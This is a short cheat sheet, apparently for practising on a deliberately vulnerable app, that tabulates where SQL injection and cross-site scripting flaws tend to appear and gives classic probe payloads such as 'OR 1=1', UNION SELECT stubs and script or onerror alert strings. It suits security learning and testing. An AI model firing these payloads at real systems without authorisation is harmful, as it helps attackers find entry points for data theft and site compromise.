# Endpoints & Where to find them (Ofc Vulnerable One):

### 🧨 SQL Injection (SQLi) - Where to Look

| Endpoint Example                   | Method | Parameter/Field     | Location        | Example Payload             |
|-----------------------------------|--------|---------------------|------------------|-----------------------------|
| `/login`                          | POST   | `username`, `pass`  | Web Form         | `' OR '1'='1`               |
| `/search?q=`                      | GET    | `q` (search term)   | URL Query        | `test'--`                   |
| `/products?id=1`                  | GET    | `id`                | URL Query        | `1 OR 1=1`                  |
| `/order`                          | POST   | `productId`         | API Body JSON    | `"productId":"1 OR 1=1"`    |
| `/profile/update`                | POST   | `user_id`           | Cookie/Header    | `1' UNION SELECT...`        |
| `/api/products/filter`            | POST   | `filterBy`          | API Body         | `' OR 'a'='a`               |
| `/admin.php?view=users`           | GET    | `view`              | URL              | `' UNION SELECT NULL,NULL`  |

🔍 *Look at query parameters, form inputs, and even headers like cookies or custom headers.*

---

### 🎯 Cross-Site Scripting (XSS) - Where to Look

| Endpoint Example                   | Method | Parameter/Field      | Location         | Example Payload                          |
|-----------------------------------|--------|----------------------|------------------|------------------------------------------|
| `/search?q=`                      | GET    | `q`                  | URL              | `<script>alert(1)</script>`              |
| `/comment`                        | POST   | `comment`            | Web Form/API     | `<img src=x onerror=alert(1)>`           |
| `/profile?name=`                  | GET    | `name`               | URL              | `"><script>alert('xss')</script>`        |
| `/api/feedback`                   | POST   | `message`            | API JSON Body    | `<svg onload=alert(1)>`                  |
| `/dashboard`                      | GET    | Injected DOM Input   | DOM (via JS)     | `location.hash = "<script>..."`          |
| HTTP Headers                      | ANY    | `Referer`, `User-Agent`| Headers         | `<script>alert(1)</script>`              |
| 404/500 Error Pages               | GET    | URL/Reflected inputs | Server Response  | `/nonexistent<script>alert(1)</script>`  |

🔍 *DOM-based XSS often hides in JavaScript-rendered pages, while reflected and stored XSS appear through immediate or saved reflections.*
